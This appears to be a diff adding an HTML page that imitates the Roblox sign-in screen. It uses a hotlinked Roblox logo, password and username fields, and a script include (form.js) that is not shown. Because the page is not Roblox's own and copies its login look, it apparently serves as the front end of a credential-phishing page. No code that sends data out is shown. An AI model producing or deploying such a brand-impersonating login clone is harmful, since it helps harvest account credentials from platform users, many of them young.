@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Sign In</title>
+<style>
+:root{
+  --bg:#000;
+  --field:#1b1d22;
+  --text:#fff;
+  --muted:#8d93a0;
+  --line:#fff;
+  --link:#4d8dff;
+  --btn-off:#c9cbd1;
+  --btn-off-text:#7b7f8a;
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){--bg:#000}}
+:root[data-theme="dark"]{--bg:#000}
+
+*{box-sizing:border-box}
+html,body{height:100%;margin:0}
+
+body{
+  background-color:var(--bg);
+  background-image:url('https://xboxwire.thesourcemediaassets.com/sites/2/2025/09/Roblox_GDK_Header-707e033c88306bee69e1.jpg');
+  background-position:center;
+  background-size:cover;
+  background-repeat:no-repeat;
+  color:var(--text);
+  font-family:"Inter",system-ui,-apple-system,"Segoe UI",sans-serif;
+  overflow-x:hidden;
+  position:relative;
+}
+
+body::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  z-index:1;
+  background:rgba(0,0,0,.2);
+  pointer-events:none;
+}
+
+main{
+  position:relative;
+  z-index:2;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  padding:24px 16px;
+}
+
+.logo{
+  font-size:clamp(36px, 8vw, 96px);
+  max-width: 280px;
+  width: 100%;
+  height: auto;
+  font-weight:900;
+  letter-spacing:-2px;
+  margin:0 0 36px;
+  object-fit: contain;
+}
+
+.form{
+  width:100%;
+  max-width:450px;
+  display:flex;
+  flex-direction:column;
+  gap:16px;
+}
+
+.field{position:relative}
+
+input{
+  width:100%;
+  height:48px;
+  border-radius:8px;
+  border:1px solid #2b2e36;
+  background:var(--field);
+  color:var(--text);
+  padding:0 44px 0 13px;
+  font-size:16px;
+  outline:none;
+}
+input:focus{border-color:#6a7385}
+
+.eye{
+  position:absolute;
+  right:12px;
+  top:50%;
+  transform:translateY(-50%);
+  background:none;
+  border:0;
+  color:var(--text);
+  cursor:pointer;
+  padding:8px;
+  font-size:18px;
+  line-height:1;
+}
+
+button.main, button.alt{
+  height:52px;
+  border-radius:8px;
+  font-size:17px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+button.main{
+  border:0;
+  background:var(--btn-off);
+  color:var(--btn-off-text);
+  margin-top:2px;
+}
+button.main.on{background:#fff;color:#000}
+
+button.alt{
+  background:rgba(0,0,0,.6);
+  color:var(--text);
+  border:1px solid var(--line);
+  margin-top:12px;
+}
+
+.small{text-align:center;font-size:13px;margin-top:20px}
+.small a{color:var(--text);text-decoration:none}
+
+.legal{
+  display:flex;
+  gap:24px;
+  justify-content:center;
+  margin-top:24px;
+}
+.legal a{color:var(--link);font-weight:700;font-size:16px}
+
+/* ==========================================
+   TELEFON VA MOBIL QURILMALAR UCHUN STYLES
+   ========================================== */
+@media (max-width: 600px) {
+  main {
+    justify-content: space-between;
+    padding-top: calc(env(safe-area-inset-top, 0px) + 20px);
+    padding-bottom: calc(env(safe-area-inset-bottom, 0px) + 20px);
+  }
+
+  .logo {
+    max-width: 200px;
+    margin-bottom: 24px;
+  }
+
+  .form {
+    gap: 12px;
+  }
+
+  input {
+    height: 46px;
+    font-size: 15px;
+  }
+
+  button.main, button.alt {
+    height: 48px;
+    font-size: 15px;
+  }
+
+  .legal {
+    gap: 20px;
+  }
+  
+  .legal a {
+    font-size: 15px;
+  }
+}
+</style>
+</head>
+<body>
+<main>
+  <img class="logo" src="https://static.freepnglogo.com/images/all_img/1706371225roblox-logo-png.png">
+  <div class="form">
+    <div class="field"><input id="u" type="text" placeholder="Username/Email/Phone" autocomplete="username"></div>
+    <div class="field"><input id="p" type="password" placeholder="Password" autocomplete="current-password"><button class="eye" id="eye" type="button" aria-label="Show password">👁</button></div>
+    <button class="main" id="go" type="button" disabled>Sign In</button>
+    <button class="alt" type="button">Email Me a One-Time Code</button>
+    <button class="alt" type="button" style="margin-top:0">Quick Sign-in</button>
+  </div>
+  <div class="small"><a href="#">Forgot Password or Username?</a></div>
+  <div class="legal"><a href="#">Terms</a><a href="#">Privacy</a></div>
+</main>
+
+<script src="form.js"></script>
+</body>
+</html>
